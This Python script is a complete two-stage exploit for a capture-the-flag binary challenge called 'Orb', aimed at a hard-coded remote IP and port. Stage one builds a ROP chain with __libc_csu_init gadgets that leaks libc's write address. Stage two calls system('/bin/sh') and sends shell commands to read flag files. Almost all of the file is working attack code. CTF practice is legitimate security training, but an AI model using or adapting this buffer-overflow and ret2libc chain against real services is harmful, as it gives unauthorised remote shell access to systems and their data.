#!/usr/bin/env python3
"""Two-stage exploit for the Orb pwn challenge.
Stage 1: leak libc write() via write(1, write@got, 8), then re-enter main.
Stage 2: ret2system("/bin/sh").
"""
import socket, struct, sys, time

HOST = "154.57.164.61"
PORT = 30708

# ---- offsets known from binary triage ----
POP_RDI            = 0x40127b      # pop rdi; ret
RET                = 0x40127c      # ret (movaps alignment)
CSU_POP_GADGET     = 0x401272      # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
CSU_MID_GADGET     = 0x401258      # mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]; ...
WRITE_PLT          = 0x401030
WRITE_GOT          = 0x403fd0
MAIN               = 0x40119f

LIBC_WRITE_OFF     = 0x1100f0
LIBC_SYSTEM_OFF    = 0x4f420
LIBC_BINSH_OFF     = 0x1b3d88

p64 = lambda x: struct.pack("<Q", x & 0xffffffffffffffff)

PAD = b"A" * 40

def recvuntil(sock, marker, timeout=5):
    sock.settimeout(timeout)
    buf = b""
    while marker not in buf:
        chunk = sock.recv(1)
        if not chunk: break
        buf += chunk
    return buf

def main():
    s = socket.create_connection((HOST, PORT))
    intro = recvuntil(s, b"Cast spell:")
    sys.stdout.write(intro.decode(errors='replace'))

    # ---------- Stage 1: leak libc ----------
    # Use the universal __libc_csu_init gadget pair to call write(1, write@got, 8)
    # then return to main for round 2.
    chain1 = b"".join([
        PAD,
        p64(CSU_POP_GADGET),  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
        p64(0),               # rbx
        p64(1),               # rbp (loop terminator)
        p64(1),               # r12 -> edi (fd=stdout)
        p64(WRITE_GOT),       # r13 -> rsi (buf = write GOT entry)
        p64(8),               # r14 -> rdx (count)
        p64(WRITE_GOT),       # r15 -> call target = [r15+rbx*8] = *write_got = libc write
        p64(CSU_MID_GADGET),  # the mov/call gadget
        # CSU mid gadget tail does: add rsp,8; pop rbx,rbp,r12,r13,r14,r15; ret  (7 slots)
        p64(0)*7,
        p64(MAIN),            # back to main for round 2
    ])
    s.sendall(chain1 + b"\n")

    # After read returns, main first prints "This spell does not seem to work..\n"
    # (the 0x26-byte tail write) and ONLY THEN does the ret hand control to our ROP.
    # So drain the tail message first, *then* read the 8-byte leak.
    # The trailing message is exactly: \nThis spell does not seem to work..\n\n\x00
    # (38 bytes total including the leading \n and ONE trailing null)
    recvuntil(s, b"This spell does not seem to work..\n\n\x00")
    s.settimeout(5)
    leak_buf = b""
    while len(leak_buf) < 8:
        chunk = s.recv(8 - len(leak_buf))
        if not chunk: break
        leak_buf += chunk
    print(f"\n[DEBUG] raw leak bytes (hex): {leak_buf.hex()}")
    libc_write = struct.unpack("<Q", leak_buf[:8])[0]
    print(f"[+] leaked write@libc = {hex(libc_write)} ({libc_write})")
    libc_base = libc_write - LIBC_WRITE_OFF
    print(f"[+] libc base         = {hex(libc_base)}")
    system_addr = libc_base + LIBC_SYSTEM_OFF
    binsh_addr  = libc_base + LIBC_BINSH_OFF
    print(f"[+] system            = {hex(system_addr)}")
    print(f"[+] /bin/sh           = {hex(binsh_addr)}")

    # After Stage 1 the chain returned into main, which prints the intro again.
    # Drain any leftover bytes including the new "Cast spell:" prompt.
    s.settimeout(2)
    try:
        while True:
            c = s.recv(4096)
            if not c: break
    except socket.timeout:
        pass

    # ---------- Stage 2: ret2system ----------
    chain2 = b"".join([
        PAD,
        p64(RET),             # 16-byte stack alignment for movaps inside system
        p64(POP_RDI),
        p64(binsh_addr),
        p64(system_addr),
    ])
    s.sendall(chain2 + b"\n")
    time.sleep(0.3)

    # ---------- interactive shell ----------
    s.sendall(b"cat flag.txt\n")
    time.sleep(0.5)
    s.settimeout(3)
    try:
        out = s.recv(4096)
        print("\n[+] shell output:")
        print(out.decode(errors='replace'))
    except socket.timeout:
        print("[!] no immediate output, trying second read...")
        s.sendall(b"id; ls; cat flag.txt; cat /home/*/flag.txt 2>/dev/null\n")
        time.sleep(0.5)
        try:
            out = s.recv(4096)
            print(out.decode(errors='replace'))
        except: pass
    s.close()

if __name__ == "__main__":
    main()
